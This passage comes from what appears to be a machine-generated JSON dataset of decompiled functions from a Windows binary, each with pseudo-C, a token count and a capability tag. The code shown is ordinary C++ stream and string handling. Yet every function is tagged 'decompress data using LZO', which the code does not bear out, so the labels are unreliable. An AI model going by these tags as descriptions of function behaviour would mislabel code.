fcn.004a36d0(piVar7);\n        iVar5 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar5 + 0x10) & 1) != 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3840();\n    }\n    else {\n        if (*(iVar5 + 0x75) == '\\0') {\n            piVar2 = *(iVar5 + 0x7c);\n            if (piVar2 == NULL) goto code_r0x0046a753;\n            if (*(piVar2 + 7) == '\\0') {\n                fcn.00431cc0();\n                var_2ch = 0x20;\n                cVar4 = ' ';\n                if (*(*piVar2 + 0x18) != 0x431f70) {\n                    cVar4 = (**(*piVar2 + 0x18))(0x20);\n                    var_2ch = cVar4;\n                }\n            }\n            else {\n                cVar4 = *(piVar2 + 0x3d);\n                var_2ch = cVar4;\n            }\n            *(iVar5 + 0x74) = cVar4;\n            iVar3 = *in_ECX;\n            *(iVar5 + 0x75) = 1;\n            iVar5 = *(iVar3 + -0xc) + in_ECX;\n        }\n        else {\n            var_2ch = *(iVar5 + 0x74);\n        }\n        (**(*piVar7 + 8))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, var_2ch, arg_8h);\n        if (extraout_DL != '\\0') {\n            fcn.0049c600();\n        }\n    }\ncode_r0x0046a684:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar4 = fcn.0049e8f0();\n        if ((cVar4 == '\\0') && (piVar7 = *(var_1ch + iVar5 + 0x78),  piVar7 != NULL)) {\n            iVar5 = (**(*piVar7 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.0049c600(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 1050
    },
    "0046a7d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __thiscall fcn.0046a7d0(int32_t *param_1, ulong param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    char cVar4;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t iVar7;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0046a230(param_1);\n    if (var_20h == '\\0') goto code_r0x0046a86d;\n    iVar5 = *(*param_1 + -0xc) + param_1;\n    piVar2 = *(iVar5 + 0x80);\n    if (piVar2 == NULL) {\n        fcn.0049e780();\ncode_r0x0046a943:\n        uVar6 = fcn.0049e780();\n        iVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004a36d0(uVar6);\n            param_1 = param_1 + *(*param_1 + -0xc);\n            param_1[5] = param_1[5] | 1;\n            if ((*(param_1 + 4) & 1) == 0) {\n                iVar5 = fcn.004a3b60();\n                fcn.004a3840();\n            }\n            else {\n                fcn.004a3b60();\n                fcn.004a3840();\n            }\n            fcn.0046a2f0();\n            fcn.0041b360(iVar5);\n            iVar7 = iVar5;\n        }\n        fcn.004a36d0(iVar7);\n        iVar5 = *(*param_1 + -0xc);\n        puVar1 = param_1 + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(param_1 + iVar5 + 0x10) & 1) != 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3840();\n    }\n    else {\n        if (*(iVar5 + 0x75) == '\\0') {\n            piVar3 = *(iVar5 + 0x7c);\n            if (piVar3 == NULL) goto code_r0x0046a943;\n            if (*(piVar3 + 7) == '\\0') {\n                fcn.00431cc0();\n                var_34h = 0x20;\n                cVar4 = ' ';\n                if (*(*piVar3 + 0x18) != 0x431f70) {\n                    cVar4 = (**(*piVar3 + 0x18))(0x20);\n                    var_34h = cVar4;\n                }\n            }\n            else {\n                cVar4 = *(piVar3 + 0x3d);\n                var_34h = cVar4;\n            }\n            *(iVar5 + 0x74) = cVar4;\n            iVar7 = *param_1;\n            *(iVar5 + 0x75) = 1;\n            iVar5 = *(iVar7 + -0xc) + param_1;\n        }\n        else {\n            var_34h = *(iVar5 + 0x74);\n        }\n        (**(*piVar2 + 0x1c))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, var_34h, param_2);\n        if (extraout_DL != '\\0') {\n            fcn.0049c600();\n        }\n    }\ncode_r0x0046a86d:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar4 = fcn.0049e8f0();\n        if ((cVar4 == '\\0') && (piVar2 = *(var_1ch + iVar5 + 0x78),  piVar2 != NULL)) {\n            iVar5 = (**(*piVar2 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.0049c600(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 1045
    },
    "0046a9c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __thiscall fcn.0046a9c0(int32_t *param_1, unkbyte10 param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    char cVar4;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t iVar7;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0046a230(param_1);\n    if (var_20h == '\\0') goto code_r0x0046aa57;\n    iVar5 = *(*param_1 + -0xc) + param_1;\n    piVar2 = *(iVar5 + 0x80);\n    if (piVar2 == NULL) {\n        fcn.0049e780();\ncode_r0x0046ab23:\n        uVar6 = fcn.0049e780();\n        iVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004a36d0(uVar6);\n            param_1 = param_1 + *(*param_1 + -0xc);\n            param_1[5] = param_1[5] | 1;\n            if ((*(param_1 + 4) & 1) == 0) {\n                iVar5 = fcn.004a3b60();\n                fcn.004a3840();\n            }\n            else {\n                fcn.004a3b60();\n                fcn.004a3840();\n            }\n            fcn.0046a2f0();\n            fcn.0041b360(iVar5);\n            iVar7 = iVar5;\n        }\n        fcn.004a36d0(iVar7);\n        iVar5 = *(*param_1 + -0xc);\n        puVar1 = param_1 + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(param_1 + iVar5 + 0x10) & 1) != 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3840();\n    }\n    else {\n        if (*(iVar5 + 0x75) == '\\0') {\n            piVar3 = *(iVar5 + 0x7c);\n            if (piVar3 == NULL) goto code_r0x0046ab23;\n            if (*(piVar3 + 7) == '\\0') {\n                fcn.00431cc0();\n                var_2ch = 0x20;\n                cVar4 = ' ';\n                if (*(*piVar3 + 0x18) != 0x431f70) {\n                    cVar4 = (**(*piVar3 + 0x18))(0x20);\n                    var_2ch = cVar4;\n                }\n            }\n            else {\n                cVar4 = *(piVar3 + 0x3d);\n                var_2ch = cVar4;\n            }\n            *(iVar5 + 0x74) = cVar4;\n            iVar7 = *param_1;\n            *(iVar5 + 0x75) = 1;\n            iVar5 = *(iVar7 + -0xc) + param_1;\n        }\n        else {\n            var_2ch = *(iVar5 + 0x74);\n        }\n        (**(*piVar2 + 0x20))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, var_2ch, param_2);\n        if (extraout_DL != '\\0') {\n            fcn.0049c600();\n        }\n    }\ncode_r0x0046aa57:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar4 = fcn.0049e8f0();\n        if ((cVar4 == '\\0') && (piVar2 = *(var_1ch + iVar5 + 0x78),  piVar2 != NULL)) {\n            iVar5 = (**(*piVar2 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.0049c600(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 1044
    },
    "0046ad80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0046ad80(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char cVar4;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t *piVar7;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0046a230();\n    if (var_20h == '\\0') goto code_r0x0046ae17;\n    iVar5 = *(*in_ECX + -0xc) + in_ECX;\n    piVar7 = *(iVar5 + 0x80);\n    if (piVar7 == NULL) {\n        fcn.0049e780();\ncode_r0x0046aee3:\n        uVar6 = fcn.0049e780();\n        piVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004a36d0(piVar7);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004a3b60();\n                fcn.004a3840();\n            }\n            else {\n                fcn.004a3b60();\n                fcn.004a3840();\n            }\n            fcn.0046a2f0();\n            piVar7 = in_ECX;\n            fcn.0041b360(in_ECX);\n        }\n        fcn.004a36d0(piVar7);\n        iVar5 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar5 + 0x10) & 1) != 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3840();\n    }\n    else {\n        if (*(iVar5 + 0x75) == '\\0') {\n            piVar2 = *(iVar5 + 0x7c);\n            if (piVar2 == NULL) goto code_r0x0046aee3;\n            if (*(piVar2 + 7) == '\\0') {\n                fcn.00431cc0();\n                var_30h = 0x20;\n                cVar4 = ' ';\n                if (*(*piVar2 + 0x18) != 0x431f70) {\n                    cVar4 = (**(*piVar2 + 0x18))(0x20);\n                    var_30h = cVar4;\n                }\n            }\n            else {\n                cVar4 = *(piVar2 + 0x3d);\n                var_30h = cVar4;\n            }\n            *(iVar5 + 0x74) = cVar4;\n            iVar3 = *in_ECX;\n            *(iVar5 + 0x75) = 1;\n            iVar5 = *(iVar3 + -0xc) + in_ECX;\n        }\n        else {\n            var_30h = *(iVar5 + 0x74);\n        }\n        (**(*piVar7 + 0x10))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, var_30h, arg_8h);\n        if (extraout_DL != '\\0') {\n            fcn.0049c600();\n        }\n    }\ncode_r0x0046ae17:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar4 = fcn.0049e8f0();\n        if ((cVar4 == '\\0') && (piVar7 = *(var_1ch + iVar5 + 0x78),  piVar7 != NULL)) {\n            iVar5 = (**(*piVar7 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.0049c600(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 1045
    },
    "0046af60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0046af60(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char cVar4;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t *piVar7;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0046a230();\n    if (var_20h == '\\0') goto code_r0x0046b014;\n    iVar5 = *(*in_ECX + -0xc) + in_ECX;\n    piVar7 = *(iVar5 + 0x80);\n    if (piVar7 == NULL) {\n        fcn.0049e780();\ncode_r0x0046b0e3:\n        uVar6 = fcn.0049e780();\n        piVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004a36d0(piVar7);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004a3b60();\n                fcn.004a3840();\n            }\n            else {\n                fcn.004a3b60();\n                fcn.004a3840();\n            }\n            fcn.0046a2f0();\n            piVar7 = in_ECX;\n            fcn.0041b360(in_ECX);\n        }\n        fcn.004a36d0(piVar7);\n        iVar5 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar5 + 0x10) & 1) != 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3840();\n    }\n    else {\n        if (*(iVar5 + 0x75) == '\\0') {\n            piVar2 = *(iVar5 + 0x7c);\n            if (piVar2 == NULL) goto code_r0x0046b0e3;\n            if (*(piVar2 + 7) == '\\0') {\n                fcn.00431cc0();\n                var_30h = 0x20;\n                cVar4 = ' ';\n                if (*(*piVar2 + 0x18) != 0x431f70) {\n                    cVar4 = (**(*piVar2 + 0x18))(0x20);\n                    var_30h = cVar4;\n                }\n            }\n            else {\n                cVar4 = *(piVar2 + 0x3d);\n                var_30h = cVar4;\n            }\n            *(iVar5 + 0x74) = cVar4;\n            iVar3 = *in_ECX;\n            *(iVar5 + 0x75) = 1;\n            iVar5 = *(iVar3 + -0xc) + in_ECX;\n        }\n        else {\n            var_30h = *(iVar5 + 0x74);\n        }\n        (**(*piVar7 + 0x14))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, var_30h, arg_8h, arg_ch);\n        if (extraout_DL != '\\0') {\n            fcn.0049c600();\n        }\n    }\ncode_r0x0046b014:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar4 = fcn.0049e8f0();\n        if ((cVar4 == '\\0') && (piVar7 = *(var_1ch + iVar5 + 0x78),  piVar7 != NULL)) {\n            iVar5 = (**(*piVar7 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.0049c600(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 1075
    },
    "0046b360": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0046b360(int32_t *arg_8h)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    uint *in_ECX;\n    int32_t iVar3;\n    uint var_ch;\n    \n    fcn.0049b670();\n    *in_ECX = 0x50a750;\n    *(in_ECX + 0x1e) = 0;\n    iVar3 = *arg_8h;\n    in_ECX[0x1d] = 0;\n    iVar3 = arg_8h + *(iVar3 + -0xc);\n    in_ECX[0x1f] = 0;\n    in_ECX[0x20] = 0;\n    in_ECX[0x21] = 0;\n    in_ECX[0x22] = 0;\n    in_ECX[1] = 0x50a764;\n    fcn.0049ac60(iVar3);\n    fcn.0049c380(in_ECX + 0x1c);\n    uVar2 = *(iVar3 + 0x70);\n    *(iVar3 + 0x70) = 0;\n    in_ECX[0x1d] = uVar2;\n    *(in_ECX + 0x1e) = *(iVar3 + 0x74);\n    uVar1 = *(iVar3 + 0x75);\n    in_ECX[0x1f] = 0;\n    *(in_ECX + 0x79) = uVar1;\n    return;\n}\n",
        "token_count": 357
    },
    "0046b420": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0046b420(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_ch;\n    \n    fcn.0049b670();\n    in_ECX[0x1d] = 0;\n    *(in_ECX + 0x1e) = 0;\n    in_ECX[0x1f] = 0;\n    in_ECX[0x20] = 0;\n    in_ECX[0x21] = 0;\n    in_ECX[0x22] = 0;\n    *in_ECX = 0x50a750;\n    in_ECX[1] = 0x50a764;\n    fcn.0049c4a0(arg_8h);\n    return;\n}\n",
        "token_count": 184
    },
    "0046b510": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.0046b510(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.0049b670();\n    param_1[0x1d] = 0;\n    *(param_1 + 0x1e) = 0;\n    param_1[0x1f] = 0;\n    param_1[0x20] = 0;\n    param_1[0x21] = 0;\n    param_1[0x22] = 0;\n    *param_1 = 0x50a750;\n    param_1[1] = 0x50a764;\n    fcn.0049c4a0(0);\n    return;\n}\n",
        "token_count": 175
    },
    "0046b7d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0046b7d0(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t *in_ECX;\n    int32_t iVar4;\n    uchar var_11h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    \n    fcn.0046a230();\n    if (var_10h == '\\0') {\n        if (arg_8h != 0) goto code_r0x0046b828;\n        uVar3 = 1;\n        iVar4 = *(*in_ECX + -0xc) + in_ECX;\n    }\n    else {\n        iVar4 = *(*in_ECX + -0xc) + in_ECX;\n        if (arg_8h == 0) {\n            uVar3 = 1;\n        }\n        else {\n            iVar4 = fcn.0049ed40(arg_8h, *(iVar4 + 0x78), &var_11h);\n            if (iVar4 != 0) goto code_r0x0046b828;\n            uVar3 = 4;\n            iVar4 = *(*in_ECX + -0xc) + in_ECX;\n        }\n    }\n    fcn.0049c600(uVar3 | *(iVar4 + 0x14));\ncode_r0x0046b828:\n    piVar1 = var_ch;\n    iVar4 = *(*var_ch + -0xc);\n    if ((*(var_ch + iVar4 + 0xd) & 0x20) != 0) {\n        cVar2 = fcn.0049e8f0();\n        if ((cVar2 == '\\0') && (piVar1 = *(piVar1 + iVar4 + 0x78),  piVar1 != NULL)) {\n            iVar4 = (**(*piVar1 + 0x18))();\n            if (iVar4 == -1) {\n                fcn.0049c600(*(var_ch + *(*var_ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 506
    },
    "0046b970": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0046b970(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char cVar4;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t *piVar7;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0046a230();\n    if (var_20h == '\\0') goto code_r0x0046ac37;\n    iVar5 = *(*in_ECX + -0xc) + in_ECX;\n    piVar7 = *(iVar5 + 0x80);\n    if (piVar7 == NULL) {\n        fcn.0049e780();\ncode_r0x0046ad03:\n        uVar6 = fcn.0049e780();\n        piVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004a36d0(piVar7);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004a3b60();\n                fcn.004a3840();\n            }\n            else {\n                fcn.004a3b60();\n                fcn.004a3840();\n            }\n            fcn.0046a2f0();\n            piVar7 = in_ECX;\n            fcn.0041b360(in_ECX);\n        }\n        fcn.004a36d0(piVar7);\n        iVar5 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar5 + 0x10) & 1) != 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3840();\n    }\n    else {\n        if (*(iVar5 + 0x75) == '\\0') {\n            piVar2 = *(iVar5 + 0x7c);\n            if (piVar2 == NULL) goto code_r0x0046ad03;\n            if (*(piVar2 + 7) == '\\0') {\n                fcn.00431cc0();\n                var_30h = 0x20;\n                cVar4 = ' ';\n                if (*(*piVar2 + 0x18) != 0x431f70) {\n                    cVar4 = (**(*piVar2 + 0x18))(0x20);\n                    var_30h = cVar4;\n                }\n            }\n            else {\n                cVar4 = *(piVar2 + 0x3d);\n                var_30h = cVar4;\n            }\n            *(iVar5 + 0x74) = cVar4;\n            iVar3 = *in_ECX;\n            *(iVar5 + 0x75) = 1;\n            iVar5 = *(iVar3 + -0xc) + in_ECX;\n        }\n        else {\n            var_30h = *(iVar5 + 0x74);\n        }\n        (**(*piVar7 + 0xc))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, var_30h, arg_8h);\n        if (extraout_DL != '\\0') {\n            fcn.0049c600();\n        }\n    }\ncode_r0x0046ac37:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar4 = fcn.0049e8f0();\n        if ((cVar4 == '\\0') && (piVar7 = *(var_1ch + iVar5 + 0x78),  piVar7 != NULL)) {\n            iVar5 = (**(*piVar7 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.0049c600(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 1042
    },
    "0046ba10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0046ba10(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char cVar4;\n    int32_t *in_ECX;\n    char extraout_DL;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t *piVar7;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0046a230();\n    if (var_20h == '\\0') goto code_r0x0046b214;\n    iVar5 = *(*in_ECX + -0xc) + in_ECX;\n    piVar7 = *(iVar5 + 0x80);\n    if (piVar7 == NULL) {\n        fcn.0049e780();\ncode_r0x0046b2e3:\n        uVar6 = fcn.0049e780();\n        piVar7 = uVar6;\n        if (uVar6 >> 0x20 == 1) {\n            fcn.004a36d0(piVar7);\n            in_ECX = in_ECX + *(*in_ECX + -0xc);\n            in_ECX[5] = in_ECX[5] | 1;\n            if ((*(in_ECX + 4) & 1) == 0) {\n                in_ECX = fcn.004a3b60();\n                fcn.004a3840();\n            }\n            else {\n                fcn.004a3b60();\n                fcn.004a3840();\n            }\n            fcn.0046a2f0();\n            piVar7 = in_ECX;\n            fcn.0041b360(in_ECX);\n        }\n        fcn.004a36d0(piVar7);\n        iVar5 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar5 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar5 + 0x10) & 1) != 0) {\n            fcn.004a3b60();\n        }\n        fcn.004a3840();\n    }\n    else {\n        if (*(iVar5 + 0x75) == '\\0') {\n            piVar2 = *(iVar5 + 0x7c);\n            if (piVar2 == NULL) goto code_r0x0046b2e3;\n            if (*(piVar2 + 7) == '\\0') {\n                fcn.00431cc0();\n                var_30h = 0x20;\n                cVar4 = ' ';\n                if (*(*piVar2 + 0x18) != 0x431f70) {\n                    cVar4 = (**(*piVar2 + 0x18))(0x20);\n                    var_30h = cVar4;\n                }\n            }\n            else {\n                cVar4 = *(piVar2 + 0x3d);\n                var_30h = cVar4;\n            }\n            *(iVar5 + 0x74) = cVar4;\n            iVar3 = *in_ECX;\n            *(iVar5 + 0x75) = 1;\n            iVar5 = *(iVar3 + -0xc) + in_ECX;\n        }\n        else {\n            var_30h = *(iVar5 + 0x74);\n        }\n        (**(*piVar7 + 0x18))(*(iVar5 + 0x78), *(iVar5 + 0x78) == 0, iVar5, var_30h, arg_8h, arg_ch);\n        if (extraout_DL != '\\0') {\n            fcn.0049c600();\n        }\n    }\ncode_r0x0046b214:\n    iVar5 = *(*var_1ch + -0xc);\n    if ((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) {\n        cVar4 = fcn.0049e8f0();\n        if ((cVar4 == '\\0') && (piVar7 = *(var_1ch + iVar5 + 0x78),  piVar7 != NULL)) {\n            iVar5 = (**(*piVar7 + 0x18))();\n            if (iVar5 == -1) {\n                fcn.0049c600(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return in_ECX;\n}\n",
        "token_count": 1075
    },
    "0046bdb0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0046bdb0(void)\n\n{\n    fcn.0046d280(0);\n    return;\n}\n",
        "token_count": 27
    },
    "0046c0f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.0046c0f0(uint32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *extraout_ECX;\n    \n    if (0x3ffffffc < param_1) {\n        fcn.0049ec30(0x502279);\n        iVar2 = *extraout_ECX;\n        iVar1 = *(iVar2 + -0xc);\n        if (-1 < *(iVar2 + -4)) {\n            fcn.0046ba50();\n            iVar2 = *extraout_ECX;\n        }\n        return iVar2 + iVar1 + -1;\n    }\n    if (param_2 < param_1) {\n        if (param_1 < param_2 * 2) {\n            param_1 = param_2 * 2;\n        }\n        if (((0x1000 < param_1 + 0x1d) && (param_2 < param_1)) &&\n           (param_1 = (param_1 + 0x1000) - (param_1 + 0x1d & 0xfff),  0x3ffffffc < param_1)) {\n            param_1 = 0x3ffffffc;\n        }\n    }\n    iVar2 = fcn.004a3500(param_1 + 0xd);\n    *(iVar2 + 4) = param_1;\n    *(iVar2 + 8) = 0;\n    return iVar2;\n}\n",
        "token_count": 332
    },
    "0046c3b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0046c3b0(int32_t *param_1, uchar *param_2, uint32_t param_3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    int32_t *extraout_ECX;\n    uint32_t uVar6;\n    int32_t *in_stack_ffffffd8;\n    \n    if (param_3 == 0) {\n        return param_1;\n    }\n    puVar4 = *param_1;\n    if (0x3ffffffcU - *(puVar4 + -0xc) < param_3) {\n        fcn.0049ec30(0x502302);\n        iVar2 = *(*in_stack_ffffffd8 + -0xc);\n        if (iVar2 != 0) {\n            iVar3 = *extraout_ECX;\n            uVar6 = *(iVar3 + -0xc) + iVar2;\n            if ((uVar6 < *(iVar3 + -8) || uVar6 == *(iVar3 + -8)) && (*(iVar3 + -4) < 1)) {\n                puVar4 = *in_stack_ffffffd8;\n                puVar5 = *extraout_ECX + *(*extraout_ECX + -0xc);\n            }\n            else {\n                fcn.0046d280(uVar6);\n                puVar4 = *in_stack_ffffffd8;\n                puVar5 = *extraout_ECX + *(*extraout_ECX + -0xc);\n            }\n            if (iVar2 == 1) {\n                *puVar5 = *puVar4;\n            }\n            else {\n                sub.msvcrt.dll_memcpy(puVar5, puVar4, iVar2);\n            }\n            iVar2 = *extraout_ECX;\n            *(iVar2 + -4) = 0;\n            *(iVar2 + -0xc) = uVar6;\n            *(iVar2 + uVar6) = 0;\n            return extraout_ECX;\n        }\n        return extraout_ECX;\n    }\n    uVar6 = *(puVar4 + -0xc) + param_3;\n    if ((*(puVar4 + -8) <= uVar6 && uVar6 != *(puVar4 + -8)) || (piVar1 = puVar4 + -4,  puVar4 = *param_1,  0 < *piVar1)\n       ) {\n        if ((puVar4 <= param_2) && (param_2 <= puVar4 + *(puVar4 + -0xc))) {\n            fcn.0046d280(uVar6);\n            iVar2 = *param_1;\n            param_2 = param_2 + (iVar2 - puVar4);\n            puVar4 = iVar2 + *(iVar2 + -0xc);\n            goto joined_r0x0046c449;\n        }\n        fcn.0046d280(uVar6);\n        puVar4 = *param_1;\n    }\n    puVar4 = puVar4 + *(puVar4 + -0xc);\njoined_r0x0046c449:\n    if (param_3 == 1) {\n        *puVar4 = *param_2;\n    }\n    else {\n        sub.msvcrt.dll_memcpy(puVar4, param_2, param_3);\n    }\n    iVar2 = *param_1;\n    *(iVar2 + -4) = 0;\n    *(iVar2 + -0xc) = uVar6;\n    *(iVar2 + uVar6) = 0;\n    return param_1;\n}\n",
        "token_count": 803
    },
    "0046c470": {
        "rules": [
